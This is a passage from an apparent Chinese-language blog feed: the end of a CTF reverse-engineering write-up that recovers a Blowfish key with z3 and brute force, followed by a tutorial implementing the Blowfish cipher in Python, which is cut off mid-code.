class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    key_pbox = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            key_pbox[i] = <span class="hljs-built_in">ord</span>((_key[index])) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-comment"># print(p_box)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Decrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">0</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>):<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Encrypt</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">8</span>:<br>        data += <span class="hljs-string">&#x27;0&#x27;</span><br>    cipher = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        Left = (<span class="hljs-built_in">ord</span>(data[i]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">3</span>]))<br>        Right = (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">6</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">7</span>]))<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        cipher += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        cipher += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-built_in">print</span>(cipher)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Decrypt</span>(<span class="hljs-params">cipher</span>):<br>    plain = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>        Left = cipher[i:i + <span class="hljs-number">8</span>]<br>        Right = cipher[i + <span class="hljs-number">8</span>:i + <span class="hljs-number">16</span>]<br>        <span class="hljs-comment"># print(Left)</span><br>        Left = <span class="hljs-built_in">int</span>(Left, base=<span class="hljs-number">16</span>)<br>        Right = <span class="hljs-built_in">int</span>(Right, base=<span class="hljs-number">16</span>)<br>        <br>        Left, Right = Blow_Main_Decrypt(Left, Right)<br>        plain += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        plain += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    plain = <span class="hljs-built_in">int</span>(plain, base=<span class="hljs-number">16</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Now ans: &quot;</span>, <span class="hljs-built_in">hex</span>(plain)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">return</span> plain<br><br><span class="hljs-comment"># 创建8个8bits的位向量</span><br><span class="hljs-comment"># 存放在flagp[]列表中，每一个位向量符号是flag[i]</span><br>flag = [BitVec(<span class="hljs-string">&quot;flag[%d]&quot;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>S = Solver()<br><br><span class="hljs-comment"># 添加约束条件</span><br>S.add(flag[<span class="hljs-number">0</span>] * flag[<span class="hljs-number">1</span>] == <span class="hljs-number">13310</span>)<br>S.add(flag[<span class="hljs-number">2</span>] + flag[<span class="hljs-number">3</span>] == <span class="hljs-number">185</span>)<br>S.add(flag[<span class="hljs-number">6</span>] - flag[<span class="hljs-number">7</span>] == -<span class="hljs-number">19</span>)<br>S.add(flag[<span class="hljs-number">0</span>] + flag[<span class="hljs-number">7</span>] == <span class="hljs-number">195</span>)<br>S.add(flag[<span class="hljs-number">0</span>] * flag[<span class="hljs-number">5</span>] == <span class="hljs-number">9240</span>)<br><br><span class="hljs-comment"># 进一步添加约束条件，略去非常见flag字符，比如&#x27;|&#x27;  &#x27;,&#x27;  &#x27;&lt;&#x27;等</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    S.add(flag[i] &gt;= <span class="hljs-number">33</span>)<br>    S.add(flag[i] &lt;= <span class="hljs-number">125</span>)<br>    S.add(flag[i] != <span class="hljs-number">39</span>)<br>    S.add(flag[i] != <span class="hljs-number">58</span>)<br>    S.add(flag[i] != <span class="hljs-number">59</span>)<br>    S.add(flag[i] != <span class="hljs-number">60</span>)<br>    S.add(flag[i] != <span class="hljs-number">61</span>)<br>    S.add(flag[i] != <span class="hljs-number">62</span>)<br>    S.add(flag[i] != <span class="hljs-number">96</span>)<br>    S.add(flag[i] != <span class="hljs-number">124</span>)<br>    S.add(flag[i] != <span class="hljs-number">91</span>)<br>    S.add(flag[i] != <span class="hljs-number">92</span>)<br>    S.add(flag[i] != <span class="hljs-number">93</span>)<br>    S.add(flag[i] != <span class="hljs-number">94</span>)<br><span class="hljs-comment"># C即待解数据 即qword_6C10E01</span><br>C = <span class="hljs-string">&#x27;69142BA8383E7938&#x27;</span><br><span class="hljs-comment"># ans即待比对数据</span><br>ans = <span class="hljs-number">0x6f8cb46b5138c655</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    S.check()<br>    T = S.model() <span class="hljs-comment"># 得到一组解</span><br>    Try = <span class="hljs-string">&#x27;&#x27;</span><br>    condition = [] <span class="hljs-comment"># 用于把这一组解添加进约束变量，用于排除此组解</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = T.<span class="hljs-built_in">eval</span>(flag[i]).as_long() <span class="hljs-comment"># 把flag[i]从z3的类型转为python的Int类型</span><br>        condition.append(flag[i] != a)<span class="hljs-comment"># 添加约束条件，把这一整组解都作为约束条件</span><br><br>        Try += <span class="hljs-built_in">chr</span>(a) <span class="hljs-comment"># 当前解</span><br>    S.add(Or(condition))<span class="hljs-comment"># 把当前这组解添加进去，这样以后的解就不会再有此组解了</span><br>    <span class="hljs-comment"># note: 注意不可以简单使用S.add(flag[i]!=xxx)，因为这样排除其他解，即在flag[i]==xx的前提下，也有很多解</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Trying:&quot;</span>, Try, end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment"># 使用刚刚得到的值去尝试解密</span><br>    init_key_pbox(Try)<br>    Change_Box()<br>    an = BlowFish_Decrypt(C)<br><br>    <span class="hljs-keyword">if</span> an == ans:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] answer:&quot;</span>, Try)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 恢复P盒 S盒 </span><br>    p_box = copy.deepcopy(P_temp)<br>    s_box = copy.deepcopy(S_temp)<br><br></code></pre></td></tr></table></figure><p>关于S盒的提取可以说道说道，由于BlowFish的S盒是4*256的二维数组，就是有1024个值，那么在IDA就体现为这个形式</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302222010.png" alt="3.png"></p><p>以往我都是一行行复制，但无疑这样的效率是极低的，而且也很繁琐。因为我的BlowFish脚本中S盒是以4*256二维数组形式存储的，难不成我还要每次数256个来复制，然后复制4次？</p><p>显然是不科学的，所以可以借助于IDApython来帮我们提取这个S盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = <span class="hljs-number">0x6c00e0</span><br>S_Box=[[],[],[],[]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>):<br>    S_Box[i//<span class="hljs-number">256</span>].append((idc.get_wide_dword(ea)))<br>    ea += <span class="hljs-number">4</span><br><span class="hljs-built_in">print</span>(S_Box)<br></code></pre></td></tr></table></figure><p>看，简简单单几行代码就可以帮我们把这个4*256的数组按照我们所想的方式存放，多轻松（这就是技多不压身吧hhh</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这题思路很简单，就是爆破。但这题最大的收获在于学习了<strong>BlowFish加密算法</strong>，而且最重要的是学会了<strong>如何遍历z3的所有解</strong>，<strong>如何把z3类型转为python类型</strong>，以便进一步爆破求解。因为z3类型是不可以作为数组索引的，只有python的Int型才可以。</p><p>angr解此题也是一样的，也是符号执行把密钥空间缩小，然后再一个一个爆破密钥，与上面的思路完全一样</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>z3</tag>
      
      <tag>Crypto</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BlowFish 加密算法 python实现</title>
    <link href="/2023/05/29/BlowFish/"/>
    <url>/2023/05/29/BlowFish/</url>
    
    <content type="html"><![CDATA[<p>BlowFish算法复现</p><span id="more"></span><p>最近在做逆向的时候，遇到了一个新的加密算法，而且实现也比较简单，就此记录一下。</p><p>先简单介绍下BlowFish算法，这是一个对称密钥分组加密算法，而且采用feistel的加密方式，也就是每次加密64bits数据，先分成左右各32bits两部分，然后经过异或加密，F轮函数等得到密文，感觉就像是AES的mini版。</p><p>BlowFish加密会使用到两个盒，P盒以及S盒。其中P盒是18个32位的数字，通常使用Π的小数部分组成，例如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>x243F6A88<br><span class="hljs-attribute">P</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>X85A308D3<br><span class="hljs-attribute">P</span>[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>X13198A2E<br><span class="hljs-attribute">P</span>[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>X03707344<br></code></pre></td></tr></table></figure><p>其中0.1415926535的十六进制就是0.243F6A88</p><p>S盒也是由Π的小数部分组成，但S盒是4*256的二维数组。</p><p>值得一提的是，不管是在DES还是AES中，各种盒通常都是不变的，但是在BlowFish中，这两个盒都会随着我们的输入的密钥而产生变化，而且这个变化也是用BlowFish算法来实现，我们刚刚提到BlowFish核心加密就是分成左右两部分，然后异或、轮函数等，然而这也是P盒和S盒的变化算法。</p><p>整体加密流程： <strong>输入32~448bits密钥，先利用密钥对P盒 以及 S盒加密，使用加密后的P盒 S盒加密明文</strong></p><p>具体的，首先P盒和输入的密钥轮回的异或，然后使用64位的数据0去走一遍BlowFish，将得到的值重新赋给P盒，延用刚刚得到的值，类似地去改变S盒的值。</p><p>看一下代码就明确了</p><p>首先我们输入密钥，轮回地将密钥放进key_pbox里面，key_pbox只是一个中间值，用于存放32位的密钥</p><p>比如我们输入密钥<code>abcdef</code>,那么</p><p>·key_pbox[0] &#x3D; 0x61626364</p><p>·key_pbox[1] &#x3D; 0x65666162 </p><p>·key_pbox[2] &#x3D; 0x63646566……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#利用index 实现轮回取密钥操作</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-comment">#这里实现将逐个密钥字符 拼接位32位的密钥</span><br>            key_pbox[i] = <span class="hljs-built_in">ord</span>(_key[index]) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br>   <span class="hljs-comment"># P盒和密钥异或</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br></code></pre></td></tr></table></figure><p>在P盒和密钥异或完后，就使用BlowFish加密流程，再次改变P盒，变化S盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-comment"># 这里的 Blow_Mian_Eccrypt 就是BlowFish的加密算法，即左右经过异或、F轮函数、换位等</span><br>        <span class="hljs-comment"># 这里令Left = Right =0 来对P盒 和S盒变化</span><br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br>        <br>  <span class="hljs-comment"># 变化完后，Left 和 Right 并不清零 而是继续使用</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br></code></pre></td></tr></table></figure><p>到这里就得正式介绍下BlowFish的加密函数</p><p>先给出流程图</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305291921714.png" alt="20200726213533691"></p><p>这里的P1就是p_box[0],P2就是p_box[1]，走一遍这个流程，利用得到值更新相应的p_box。这里面又涉及到一个F函数，这个函数起始就是一个替代功能，它的输入是一个32bits的数，就对这个32bits的数做一些操作，丢去S盒里面找，然后替换。稍微会看到具体规则</p><p>代码实现：</p><p>代码也很简洁，看看就明白了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br>        <br><span class="hljs-comment">#最后一轮不交换 单独处理 </span><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <br>    <span class="hljs-keyword">return</span> Left, Right<br><br></code></pre></td></tr></table></figure><p>最后就是F轮函数，它的功能就是替换，下图可以很好的说明这个替换规则</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305292049603.png" alt="20200726213844931"></p><p>举个栗子，假设我们输入的32位数是0x12345678，那么分成0x12,0x34,0x56,0x78四组，分别以此为索引去各自的S盒找值，比如0x12对应<code>S[0][0x12]</code>，记为a，</p><p>0x34对应<code>S[1][0x34]</code>，记为b，</p><p>0x56对应<code>S[2][0x56]</code>，记为c，</p><p>0x78对应<code>S[3][0x78]</code>，记为d，</p><p>最终返回<code>((a+b)^c+d)</code>的低32位，作为替换后的值</p><p>代码可以更明确的说明</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br></code></pre></td></tr></table></figure><p>至此BlowFish加密的相关函数都介绍完毕，解密也是同样的流程，就不再赘述，唯一要注意的就是加密输入的明文是字符串，而解密使用的密文则是16进制数字，在把他们转化为32bits的数据时需要留心。</p><p>再来回想下整个加密流程,首先输入密钥，利用密钥对P盒 S盒加密变化，利用加密后的P盒 S盒，再将明文按64bits分组加密</p><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.Util.number<br><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Blow_BOX <span class="hljs-keyword">import</span> *<br><br>key_pbox = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>)]<br>Encrypt = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            key_pbox[i] = <span class="hljs-built_in">ord</span>(_key[index]) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Decrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">0</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> Left , Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span 